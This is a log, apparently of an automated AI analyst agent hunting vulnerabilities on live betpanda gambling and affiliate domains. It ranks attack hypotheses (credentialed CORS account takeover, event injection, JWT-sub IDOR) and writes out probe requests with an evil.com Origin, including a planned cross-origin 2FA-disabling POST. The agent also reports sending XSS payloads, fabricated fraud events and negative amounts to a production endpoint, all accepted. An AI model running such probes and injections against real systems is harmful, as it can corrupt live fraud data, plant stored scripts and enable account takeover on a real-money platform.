+[PRIO] cable.betpanda.io,6.2,attack_surface5/business_value7/tech4/gate10/cloud3/fresh8
+[STEP3-HYPOTHESES]
+[HYP] Wildcard CORS + Credentials Enables Cross-Origin ATO + State Mutation on Affiliate Money/Auth API (incl. GET state-change)
+class: MISCONFIG
+asset: affiliates.betpanda.io/rest/*
+confidence: 95
+reasoning: Live this cycle: OPTIONS /rest/user/password/reset, /set-2fa-setting, /change-password, /set-profile, /account-settings, /players all return ACAO: https://evil.com + ACAC:true; GET variants 405/401 (real authed routes). JS enumerates 30+ /rest/* routes incl. financial /agent/set-deposit-withdraw-limit, /v2/report, /user/selectable-payout-networks, and CSRF-style GET /agent/enable/{agentId}/{enabled}. Password flow: GET /public/recover-password/email/{email} (enum, out of scope) → email code → SPA /reset-password/:affiliateId/:resetPasswordCode → POST /rest/user/password/reset. Public layer (/rest/public/register, /login, /config, /phone/*/verify) shares the wildcard-CORS+credentials backend. Cookie session auth (401 bare /rest/user). Any evil Origin can issue credentialed cross-origin read/write against victim session.
+evidence_needed: Authenticated session + evil-Origin credentialed GET returning victim PII/money metrics; evil-Origin POST /rest/user/set-2fa-setting or /password/reset accepted.
+verify_steps: AUTH_HELPED: GET https://affiliates.betpanda.io/rest/user/metrics/affiliate -H "Origin: https://evil.com" -H "Cookie: <session>" → expect ACAO:evil.com + ACAC:true + real data; POST /rest/user/set-2fa-setting {verificationEnabled:false} -H "Origin: https://evil.com" → confirm cross-origin mutation; OPTIONS /rest/agent/enable/1/false -H "Origin: https://evil.com" → confirm preflight reflects.
+impact: Cross-origin PII/transaction/commission exfiltration, payout/2FA/password takeover on money-flow affiliate API; GET-based blind state mutations — CRITICAL
+testability: AUTH_HELPED
+[HYP] Unauthenticated Event Injection Enables Fraud-Metrics Poisoning / Stored-XSS Delivery
+class: BUSLOGIC
+asset: cable.betpanda.io/cable/user-event
+confidence: 80
+reasoning: Live this cycle: camelCase schema reverse-derived via incremental validation errors — eventType, userId (alphanumeric), registeredOn (RFC3339), amount, currency, ip, device, metadata, referrer (valid-domain enforced). eventType accepts arbitrary values (bet_placed, fraud_flag, unknown_x, <img onerror>, all 200). Negative amount (-99999), nested {"metadata":{"x":"<script>alert(1)</script>"}} accepted. No auth, CORS *. No downstream read path observable passively.
+evidence_needed: (1) fabricated deposit/bonus events propagating to analytics/leaderboard/bonus grant; (2) stored event fields rendering in admin UI.
+verify_steps: AUTH_HELPED: POST event with marked eventType/amount string → look for reflection in any admin/report surface; passive fuzz of eventType vocabulary has no server-side rejection.
+impact: Fraud/bonus-abuse priming, fraud-detection evasion, metrics poisoning, stored XSS in any dashboard consuming events — HIGH
+testability: AUTH_HELPED
+[HYP] BOLA/IDOR on Casino Money-Flow REST via Cognito JWT sub (Same-Origin Only)
+class: IDOR
+asset: betpandacasino.io/rest/user/*, betpanda.partners/rest/user/*
+confidence: 70
+reasoning: Shared Spring Boot backend; money endpoints POST-only (account-balances-and-bonuses 405, authenticate 403 needs x-captcha-token), settings 401, REFRESH_TOKEN cookie SameSite=Lax. THIS CYCLE: betpanda.partners CORS confirmed pinned (no ACAO reflection) → cross-origin vector absent on casino pair; but SSRF→ same-origin IDOR remains viable; JWT sub claim is the only apparent per-user ACL.
+evidence_needed: Authenticated JWT; mutate sub claim → victim-identity response diff on POST /rest/user/account-balances-and-bonuses or /rest/user/settings.
+verify_steps: AUTH_HELPED: capture JWT from session; tamper sub; POST balance/bonus + settings requests; diff responses vs self identity.
+impact: Cross-user wallet/balance/bonus disclosure or modification on real-money platform — HIGH
+testability: AUTH_HELPED
+[STEP4-SELF-CRITIQUE]
+[PARKED] Passwordless/Phone signin via /rest/public/phone/*: routes exist (415 on wrong content-type shows handler present) but JSON POST returns 404 and schema is obfuscated in lazy chunk — cannot assess passively this cycle.
+[PARKED] Cross-origin account-recovery initiation chaining: no public mutating recovery step beyond out-of-scope email enumeration; reset code is the credential and no code-theft vector identified → subsumed into HYP1 chain.
+[FINAL] 1. Wildcard CORS + credentials ATO/state-mutation (affiliates.betpanda.io, 95)
+[FINAL] 2. Unauthenticated event injection → fraud/analytics poisoning + stored-XSS (cable.betpanda.io, 80)
+[FINAL] 3. JWT-sub BOLA/IDOR on casino money-flow (betpandacasino.io/betpanda.partners, 70)
+[STEP5-NEXT-ACTION]
+[NEXT] HUMAN: Authorized human creates ONE disposable test affiliate via POST https://affiliates.betpanda.io/rest/public/register (per account_creation:restricted; schema from SPA main.ef021e68.js lazy chunk — capture from /register page network tab), captures Set-Cookie; then (1) GET https://affiliates.betpanda.io/rest/user/metrics/affiliate -H "Origin: https://evil.com" -H "Cookie: <session>" → expect ACAO:evil.com + ACAC:true + real data; (2) GET /rest/user → expect 200 (logged-in auth-state probe); (3) proof POST /rest/user/set-2fa-setting {"verificationEnabled":false} -H "Origin: https://evil.com". This closes the CORS+credentials POC loop and unlocks the final report.
+[STEP6-LEARNING]
+[LEARN] REJECTED MISCONFIG @ betpanda.partners/rest/*: CORS properly pinned — OPTIONS and GET with evil Origin return Vary:Origin but NO ACAO reflection; same Spring Boot backend as betpandacasino.io, cross-origin credential vector ABSENT (only affiliates.betpanda.io is wildcard).
+[LEARN] ACCEPTED BUSLOGIC @ cable.betpanda.io/cable/user-event: full schema reverse-derived (eventType/userId/registeredOn/amount/referrer/currency/ip/device/metadata); arbitrary eventType accepted incl. XSS strings; negative amounts and nested script accepted (200) — injection primitive concrete.
+[LEARN] NEW ENDPOINTS @ affiliates.betpanda.io: /rest/v2/report (POST-only 405-GET), /rest/v2/report/sub-affiliates, /rest/v2/report/daily-stats-with-comparison, /rest/user/selectable-payout-currencies, /rest/user/selectable-payout-networks, /rest/metrics/top-metrics-revenue-chart, /rest/trk/list, /rest/agent/id/{id}, /rest/agent/enable/{id}/{enabled} (GET state-changing, 401).
+[LEARN] NEW SPA ROUTE @ affiliates.betpanda.io: /reset-password/:affiliateId/:resetPasswordCode — reset code in URL is the credential binding for POST /rest/user/password/reset.
+[LEARN] NEW ENDPOINTS @ affiliates.betpanda.io/rest/public/phone/*: signin/verify + register/verify POST-only JSON (415 on form-encoded ⇒ handler present), reflect evil Origin + ACAC:true; JSON body returns 404 (schema obfuscated).
+[CHANGED] RE-AFFIRMED @ affiliates.betpanda.io: password/reset, set-2fa-setting, change-password, set-profile all 405-GET real POST routes reflecting evil Origin + ACAC:true (fresh probes this cycle).
+[STEP7-RISK]
+[RISK] betpanda: 55 — Top finding re-confirmed backend-wide with fresh ACAO reflection on all ATO-relevant authed routes plus newly enumerated GET state-change (/rest/agent/enable) and public phone/AUTH primitives; betpanda.partners CORS confirmed pinned (containment: shared-backend IDOR is same-origin only). cable unauth event-injection schema fully mapped → concrete poisoning/stored-XSS delivery primitive. Program value still POC-gated on one authenticated affiliate session to close #1.
+EOF
+echo "written"
+written
+[0m
+[0m$ [0mcat >> /home/runner/work/betpanda-hunt/betpanda-hunt/reports/analyst-bigpickle.log << 'EOF'
+
+===== ANALYST bigpickle 2026-09-05 17:31:30 UTC =====
+> phase POC / target api
+→ Read knowledge base, state, hypotheses-bigpickle.txt (tail)
+→ Live probes this cycle:
+   - betpanda.partners: HEAD 200; OPTIONS+GET /rest/user/*, /rest/public/* → Vary:Origin, NO access-control-allow-origin (CORS pinned). GET /rest/public/config 404, POST register 404. authenticate 405 (POST-only), settings 401.
+   - affiliates.betpanda.io: POST /rest/public/register with JSON → 400 XML <Map> + ACAO:evil.com + ACAC:true; OPTIONS preflight 200 reflect. /rest/v2/report 405 GET (real POST route). /rest/public/phone/(signin|register)/verify OPTIONS 200 + ACAO reflect, POST form-encoded 415 (handler present), JSON 404. GET /rest/user 401, metrics/affiliate 401, agent/enable/1/true 401. password/reset|set-2fa-setting|change-password|set-profile OPTIONS all ACAO:evil.com+ACAC:true, GET 405.
+   - cable.betpanda.io /cable/user-event: schema reverse-engineered via validation errors (userId alnum, registeredOn RFC3339, referrer valid-domain); arbitrary eventType (bet_placed/fraud_flag/unknown_x/<img onerror>) all 200; negative amount + nested <script> in metadata accepted 200; GET/OPTIONS 405, root "Service - Ready!" banner.
+→ CloudFront d3ec3n7kizfkuy.cloudfront.net → S3 AccessDenied (no listing).
+→ Wrote reports/hypotheses-bigpickle.txt (cycle 2026-09-05 17:31:30 UTC)
+[SUMMARY] No surface change on casino pair; affiliates CORS re-affirmed + expanded (GET state-change, phone primitives, v2/report); cable schema fully mapped. Top-3 FINAL unchanged in rank: CORS ATO(95) > cable event-injection(80) > casino JWT-sub IDOR(70). POC gate on authenticated affiliate session remains the sole blocker for #1.
+EOF
+echo done
+done
+[0m
+Analysis cycle complete. Summary of this cycle's output:
+
+**STEP 1 — DELTA (key findings):**
+- `betpanda.partners/rest/*` → **CORS confirmed PINNED** (Vary:Origin, no ACAO reflection) — shared backend but no cross-origin vector; casino pair IDOR is same-origin only. New REJECTED entry.
+- `affiliates.betpanda.io` → fresh reconfirm: `/rest/user/password/reset`, `/set-2fa-setting`, `/change-password`, `/set-profile` all 405-GET real routes, all reflect `ACAO:evil.com + ACAC:true`. New surface: `/rest/v2/report` (POST), `/rest/agent/enable/{id}/{enabled}` (**GET state-change**, 401), `/rest/public/phone/*/verify` (POST JSON, 415 on form ⇒ handler present), SPA route `/reset-password/:affiliateId/:resetPasswordCode`.
+- `cable.betpanda.io` → full JSON schema reverse-engineered (eventType/userId/registeredOn/amount/referrer/currency/ip/device/metadata); **arbitrary eventType accepted** incl. XSS strings; negative amounts + nested `<script>` → 200.
+
+**STEP 5 — NEXT:** still `HUMAN`: one disposable test affiliate at `/rest/public/register`, then evil-Origin credentialed GET `/rest/user/metrics/affiliate` + POST `/rest/user/set-2fa-setting` — the sole blocker for the #1 POC.
+
+**STEP 7 — RISK:** `55` — CORS+credentials ATO finding re-affirmed and broadened (GET state-change + phone primitives); cable injection primitive now concrete; casino IDOR confirmed same-origin only.
+
+Pipeline files updated: `reports/hypotheses-bigpickle.txt` (new cycle), `reports/analyst-bigpickle.log`.
